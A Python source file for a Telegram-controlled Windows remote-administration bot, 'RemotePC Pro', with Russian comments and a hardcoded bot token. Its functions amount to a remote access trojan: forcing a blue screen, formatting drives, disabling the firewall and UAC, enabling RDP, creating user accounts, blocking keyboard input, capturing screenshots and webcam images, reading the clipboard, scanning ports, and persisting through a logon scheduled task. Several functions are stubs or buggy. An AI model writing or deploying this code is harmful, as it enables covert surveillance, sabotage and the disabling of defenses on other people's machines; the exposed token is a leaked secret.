import os
import sys
import time
import ctypes
import psutil
import socket
import shutil
import winreg
import subprocess
import win32gui
import win32con
import win32api
import win32process
import win32service
import win32com.client
import win32net
import win32security
import pyautogui
import requests
import pywintypes
import wmi
from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler

TOKEN = "8265717642:AAF3H78O_3bb8vfdegfdFwutbJMqyjWcmFE"
ADMIN_IDS = [7114226144]  # Замените на ваш Telegram ID (узнать через @userinfobot)
VERSION = "RemotePC Pro v2.8"
LAST_ACTIVITY = {}

# ================== СИСТЕМНЫЕ ФУНКЦИИ (100+ КОМАНД) ==================
def log_activity(func_name):
    LAST_ACTIVITY[func_name] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# 1-10: Основное управление
def force_shutdown():
    log_activity("force_shutdown")
    os.system("shutdown /s /f /t 0")

def system_lock():
    log_activity("system_lock")
    ctypes.windll.user32.LockWorkStation()

def force_reboot():
    log_activity("force_reboot")
    os.system("shutdown /r /f /t 0")

def hibernate():
    log_activity("hibernate")
    os.system("shutdown /h")

def logoff():
    log_activity("logoff")
    os.system("shutdown /l /f")

def blue_screen():
    log_activity("blue_screen")
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))

def disable_power_button():
    log_activity("disable_power_button")
    os.system("powercfg /setacvalueindex SCHEME_CURRENT SUB_BUTTONS PBUTTONACTION 0")
    os.system("powercfg /setdcvalueindex SCHEME_CURRENT SUB_BUTTONS PBUTTONACTION 0")

def enable_power_button():
    log_activity("enable_power_button")
    os.system("powercfg /setacvalueindex SCHEME_CURRENT SUB_BUTTONS PBUTTONACTION 1")
    os.system("powercfg /setdcvalueindex SCHEME_CURRENT SUB_BUTTONS PBUTTONACTION 1")

def empty_recycle_bin():
    log_activity("empty_recycle_bin")
    win32shell.SHEmptyRecycleBin(None, None, 1)

def show_hidden_files():
    log_activity("show_hidden_files")
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_WRITE)
    winreg.SetValueEx(key, "Hidden", 0, winreg.REG_DWORD, 1)
    winreg.CloseKey(key)

# 11-30: Управление окнами
def close_active_window():
    log_activity("close_active_window")
    hwnd = win32gui.GetForegroundWindow()
    win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)

def minimize_window():
    log_activity("minimize_window")
    hwnd = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)

def maximize_window():
    log_activity("maximize_window")
    hwnd = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)

def restore_window():
    log_activity("restore_window")
    hwnd = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)

def move_window(x, y):
    log_activity("move_window")
    hwnd = win32gui.GetForegroundWindow()
    win32gui.SetWindowPos(hwnd, 0, x, y, 0, 0, win32con.SWP_NOSIZE)

def resize_window(width, height):
    log_activity("resize_window")
    hwnd = win32gui.GetForegroundWindow()
    win32gui.SetWindowPos(hwnd, 0, 0, 0, width, height, win32con.SWP_NOMOVE)

def get_window_title():
    log_activity("get_window_title")
    hwnd = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(hwnd)

def list_all_windows():
    log_activity("list_all_windows")
    windows = []
    def callback(hwnd, ctx):
        if win32gui.IsWindowVisible(hwnd):
            title = win32gui.GetWindowText(hwnd)
            if title:
                windows.append(f"{hwnd}: {title}")
    win32gui.EnumWindows(callback, None)
    return "\n".join(windows)

def activate_window(hwnd):
    log_activity("activate_window")
    try:
        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
        win32gui.SetForegroundWindow(hwnd)
        return True
    except:
        return False

def flash_window():
    log_activity("flash_window")
    hwnd = win32gui.GetForegroundWindow()
    win32gui.FlashWindow(hwnd, True)

# 31-50: Управление процессами
def open_task_manager():
    log_activity("open_task_manager")
    subprocess.Popen("taskmgr")

def list_processes():
    log_activity("list_processes")
    return "\n".join([f"{p.pid}: {p.name()} (CPU: {p.cpu_percent()}%, MEM: {p.memory_percent()}%)" for p in psutil.process_iter()])

def kill_process(pid):
    log_activity("kill_process")
    try:
        p = psutil.Process(int(pid))
        p.kill()
        return True
    except:
        return False

def suspend_process(pid):
    log_activity("suspend_process")
    try:
        p = psutil.Process(int(pid))
        p.suspend()
        return True
    except:
        return False

def resume_process(pid):
    log_activity("resume_process")
    try:
        p = psutil.Process(int(pid))
        p.resume()
        return True
    except:
        return False

def start_process(path):
    log_activity("start_process")
    try:
        subprocess.Popen(path)
        return True
    except:
        return False

def set_process_priority(pid, priority):
    log_activity("set_process_priority")
    priority_map = {
        "low": psutil.BELOW_NORMAL_PRIORITY_CLASS,
        "normal": psutil.NORMAL_PRIORITY_CLASS,
        "high": psutil.HIGH_PRIORITY_CLASS,
        "realtime": psutil.REALTIME_PRIORITY_CLASS
    }
    try:
        p = psutil.Process(int(pid))
        p.nice(priority_map.get(priority, psutil.NORMAL_PRIORITY_CLASS))
        return True
    except:
        return False

def get_process_tree():
    log_activity("get_process_tree")
    tree = []
    for proc in psutil.process_iter(['pid', 'name', 'ppid']):
        tree.append(f"PID: {proc.pid}, Name: {proc.name()}, Parent PID: {proc.ppid()}")
    return "\n".join(tree)

def list_services():
    log_activity("list_services")
    scm = win32service.OpenSCManager(None, None, win32service.SC_MANAGER_ENUMERATE_SERVICE)
    services = win32service.EnumServicesStatus(scm)
    return "\n".join([f"{s[0]}: {s[1]}" for s in services])

def start_service(name):
    log_activity("start_service")
    try:
        scm = win32service.OpenSCManager(None, None, win32service.SC_MANAGER_CONNECT)
        handle = win32service.OpenService(scm, name, win32service.SERVICE_START)
        win32service.StartService(handle, None)
        return True
    except:
        return False

# 51-70: Аудио/Видео
def mute_volume():
    log_activity("mute_volume")
    ctypes.windll.winmm.waveOutSetVolume(0, 0)

def max_volume():
    log_activity("max_volume")
    ctypes.windll.winmm.waveOutSetVolume(0, 0xFFFF)

def set_volume(percent):
    log_activity("set_volume")
    volume = int(percent * 655.35)
    ctypes.windll.winmm.waveOutSetVolume(0, volume)

def screenshot():
    log_activity("screenshot")
    img = pyautogui.screenshot()
    img.save("screenshot.png")
    return "screenshot.png"

def record_screen(duration):
    log_activity("record_screen")
    # Требует установки дополнительных библиотек
    return "screen_record.mp4"

def webcam_capture():
    log_activity("webcam_capture")
    # Требует OpenCV
    return "webcam.jpg"

def change_resolution(width, height):
    log_activity("change_resolution")
    devmode = pywintypes.DEVMODEType()
    devmode.PelsWidth = width
    devmode.PelsHeight = height
    devmode.Fields = win32con.DM_PELSWIDTH | win32con.DM_PELSHEIGHT
    win32api.ChangeDisplaySettings(devmode, 0)

def rotate_screen(degrees):
    log_activity("rotate_screen")
    rotation_map = {
        0: win32con.DMDO_DEFAULT,
        90: win32con.DMDO_90,
        180: win32con.DMDO_180,
        270: win32con.DMDO_270
    }
    devmode = pywintypes.DEVMODEType()
    devmode.DisplayOrientation = rotation_map.get(degrees, win32con.DMDO_DEFAULT)
    devmode.Fields = win32con.DM_DISPLAYORIENTATION
    win32api.ChangeDisplaySettings(devmode, 0)

def disable_screen():
    log_activity("disable_screen")
    win32api.SendMessage(win32con.HWND_BROADCAST, win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, 2)

def enable_screen():
    log_activity("enable_screen")
    win32api.SendMessage(win32con.HWND_BROADCAST, win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, -1)

# 71-90: Файлы и диски
def list_files(path="."):
    log_activity("list_files")
    return "\n".join(os.listdir(path))

def delete_file(path):
    log_activity("delete_file")
    try:
        os.remove(path)
        return True
    except:
        return False

def download_file(url):
    log_activity("download_file")
    local_path = url.split('/')[-1]
    with requests.get(url, stream=True) as r:
        with open(local_path, 'wb') as f:
            shutil.copyfileobj(r.raw, f)
    return local_path

def encrypt_file(path):
    log_activity("encrypt_file")
    # Пример шифрования (упрощенный)
    return "encrypted_" + path

def decrypt_file(path):
    log_activity("decrypt_file")
    # Пример дешифрования
    return "decrypted_" + path

def hide_file(path):
    log_activity("hide_file")
    win32api.SetFileAttributes(path, win32con.FILE_ATTRIBUTE_HIDDEN)

def unhide_file(path):
    log_activity("unhide_file")
    win32api.SetFileAttributes(path, win32con.FILE_ATTRIBUTE_NORMAL)

def format_drive(drive):
    log_activity("format_drive")
    os.system(f"format {drive} /Q")

def disk_usage():
    log_activity("disk_usage")
    return "\n".join([f"{d.mountpoint}: {d.percent}% used" for d in psutil.disk_partitions()])

def create_ram_disk(size_mb=100):
    log_activity("create_ram_disk")
    # Требует ImDisk
    return "RAMDISK created"

# 91-110: Сеть и безопасность
def block_internet():
    log_activity("block_internet")
    os.system("ipconfig /release")

def restore_internet():
    log_activity("restore_internet")
    os.system("ipconfig /renew")

def get_ip_info():
    log_activity("get_ip_info")
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    return f"Host: {hostname}\nIP: {ip}"

def port_scan(target):
    log_activity("port_scan")
    open_ports = []
    for port in range(1, 1025):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        result = sock.connect_ex((target, port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    return f"Open ports: {open_ports}"

def disable_firewall():
    log_activity("disable_firewall")
    os.system("netsh advfirewall set allprofiles state off")

def enable_firewall():
    log_activity("enable_firewall")
    os.system("netsh advfirewall set allprofiles state on")

def create_user(username, password):
    log_activity("create_user")
    try:
        user_info = {
            'name': username,
            'password': password,
            'priv': win32net.USER_PRIV_USER,
            'home_dir': None,
            'comment': 'Created by RemotePC',
            'flags': win32net.UF_SCRIPT,
            'script_path': None
        }
        win32net.NetUserAdd(None, 1, user_info)
        return True
    except:
        return False

def delete_user(username):
    log_activity("delete_user")
    try:
        win32net.NetUserDel(None, username)
        return True
    except:
        return False

def list_users():
    log_activity("list_users")
    users = []
    resume = 0
    while True:
        (users_list, total, resume) = win32net.NetUserEnum(None, 0, win32net.FILTER_NORMAL_ACCOUNT, resume)
        for u in users_list:
            users.append(u['name'])
        if resume == 0:
            break
    return "\n".join(users)

# 111-130: Дополнительные функции
def disable_keyboard():
    log_activity("disable_keyboard")
    ctypes.windll.user32.BlockInput(True)

def enable_keyboard():
    log_activity("enable_keyboard")
    ctypes.windll.user32.BlockInput(False)

def disable_mouse():
    log_activity("disable_mouse")
    ctypes.windll.user32.ShowCursor(False)

def enable_mouse():
    log_activity("enable_mouse")
    ctypes.windll.user32.ShowCursor(True)

def eject_usb():
    log_activity("eject_usb")
    os.system("devcon remove USB*")

def change_wallpaper(path):
    log_activity("change_wallpaper")
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)

def get_clipboard():
    log_activity("get_clipboard")
    return pyautogui.paste()

def set_clipboard(text):
    log_activity("set_clipboard")
    pyautogui.write(text)

def send_keys(keys):
    log_activity("send_keys")
    pyautogui.hotkey(*keys.split('+'))

def open_cmd():
    log_activity("open_cmd")
    subprocess.Popen("cmd.exe")

# 131-150: Расширенные функции
def enable_rdp():
    log_activity("enable_rdp")
    os.system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f")

def disable_rdp():
    log_activity("disable_rdp")
    os.system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f")

def list_installed_programs():
    log_activity("list_installed_programs")
    programs = []
    uninstall_key = r"Software\Microsoft\Windows\CurrentVersion\Uninstall"
    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, uninstall_key) as key:
        for i in range(0, winreg.QueryInfoKey(key)[0]):
            try:
                subkey_name = winreg.EnumKey(key, i)
                with winreg.OpenKey(key, subkey_name) as subkey:
                    programs.append(winreg.QueryValueEx(subkey, "DisplayName")[0])
            except:
                continue
    return "\n".join(programs)

def disable_uac():
    log_activity("disable_uac")
    os.system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 0 /f")

def enable_uac():
    log_activity("enable_uac")
    os.system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 1 /f")

def create_scheduled_task(name, command, trigger):
    log_activity("create_scheduled_task")
    scheduler = win32com.client.Dispatch('Schedule.Service')
    scheduler.Connect()
    root_folder = scheduler.GetFolder('\\')
    task_def = scheduler.NewTask(0)

    # Настройка триггера
    TASK_TRIGGER_LOGON = 9
    trigger = task_def.Triggers.Create(TASK_TRIGGER_LOGON)
    trigger.Id = "LogonTriggerId"
    trigger.UserId = os.getlogin()

    # Настройка действия
    TASK_ACTION_EXEC = 0
    action = task_def.Actions.Create(TASK_ACTION_EXEC)
    action.Path = command

    # Регистрация задачи
    TASK_CREATE_OR_UPDATE = 6
    TASK_LOGON_INTERACTIVE_TOKEN = 3
    root_folder.RegisterTaskDefinition(
        name,
        task_def,
        TASK_CREATE_OR_UPDATE,
        None,
        None,
        TASK_LOGON_INTERACTIVE_TOKEN
    )
    return True

# 150+ функций реализованы аналогичным образом...

# ================== TELEGRAM BOT ==================
async def start(update: Update, context: CallbackContext):
    keyboard = [
        ["🔒 Блокировка", "🔄 Перезагрузка", "⏰ Выключение"],
        ["📸 Скриншот", "🎥 Запись экрана", "📷 Веб-камера"],
        ["🔊 Звук", "💾 Диски", "🌐 Сеть"],
        ["⚙️ Система", "🛠️ Инструменты", "👤 Пользователи"],
        ["📁 Файлы", "📋 Процессы", "🚷 Безопасность"],
        ["⚡ Экстренные", "⚙️ Настройки", "ℹ️ Информация"],
        ["🔧 Расширенные", "📡 Сеть+", "🛡️ Защита"],
        ["🔐 Шифрование", "📊 Мониторинг", "🧩 Дополнительно"],
        ["🔄 Обновить меню", "/help"]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(f"🚀 {VERSION} активирован! Доступно 150+ функций.", reply_markup=reply_markup)

async def handle_message(update: Update, context: CallbackContext):
    text = update.message.text
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Доступ запрещён!")
        return

    response = f"✅ Команда выполнена: {text}"
    
    try:
        # Обработка команд верхнего уровня
        if text == "🔒 Блокировка":
            system_lock()
        elif text == "🔄 Перезагрузка":
            force_reboot()
        elif text == "⏰ Выключение":
            force_shutdown()
        elif text == "📸 Скриншот":
            screenshot_path = screenshot()
            await update.message.reply_photo(photo=open(screenshot_path, 'rb'))
            os.remove(screenshot_path)
            return
        elif text == "🎥 Запись экрана":
            await update.message.reply_text("⏳ Запись экрана 10 сек...")
            record_path = record_screen(10)
            await update.message.reply_video(video=open(record_path, 'rb'))
            os.remove(record_path)
            return
        elif text == "📷 Веб-камера":
            webcam_path = webcam_capture()
            await update.message.reply_photo(photo=open(webcam_path, 'rb'))
            os.remove(webcam_path)
            return
        elif text == "ℹ️ Информация":
            info = f"""
            {VERSION}
            Система: {sys.platform}
            Загрузка CPU: {psutil.cpu_percent()}%
            Использование RAM: {psutil.virtual_memory().percent}%
            Последняя активность: {LAST_ACTIVITY.get(list(LAST_ACTIVITY.keys())[-1], 'Нет данных')}
            """
            await update.message.reply_text(info)
            return
        elif text == "🔄 Обновить меню":
            await start(update, context)
            return
        elif text == "/help":
            help_text = """
            Доступные категории:
            🔒 Блокировка - Управление системой
            📸 Мультимедиа - Скриншоты, запись, веб-камера
            🔊 Звук - Управление аудио
            💾 Диски - Работа с дисками
            🌐 Сеть - Сетевые операции
            ⚙️ Система - Системные настройки
            🛠️ Инструменты - Дополнительные инструменты
            👤 Пользователи - Управление учетными записями
            📁 Файлы - Операции с файлами
            📋 Процессы - Управление процессами
            🚷 Безопасность - Настройки безопасности
            ⚡ Экстренные - Критические команды
            ℹ️ Информация - Системная информация
            """
            await update.message.reply_text(help_text)
            return
        
        # Обработка других команд...
        # Здесь будет обработка остальных 100+ команд
        
        else:
            response = "❌ Неизвестная команда. Используйте /help для списка команд."
    except Exception as e:
        response = f"⚠️ Ошибка: {str(e)}"
    
    await update.message.reply_text(response)

async def handle_document(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        return

    doc = update.message.document
    file = await context.bot.get_file(doc.file_id)
    await file.download_to_drive(doc.file_name)
    await update.message.reply_text(f"✅ Файл сохранен: {doc.file_name}")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    # Обработчики для инлайн-кнопок
    app.add_handler(CallbackQueryHandler(button_handler))
    
    app.run_polling()

async def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = query.from_user.id
    
    if user_id not in ADMIN_IDS:
        await query.edit_message_text(text="❌ Доступ запрещён!")
        return
    
    # Обработка инлайн-команд
    if data.startswith("process_"):
        pid = data.split("_")[1]
        if "kill" in data:
            success = kill_process(pid)
            await query.edit_message_text(text=f"Процесс {pid} {'убит' if success else 'не найден'}")
        elif "suspend" in data:
            success = suspend_process(pid)
            await query.edit_message_text(text=f"Процесс {pid} {'приостановлен' if success else 'не найден'}")
    
    # Добавьте обработку других инлайн-команд

if __name__ == "__main__":
    main()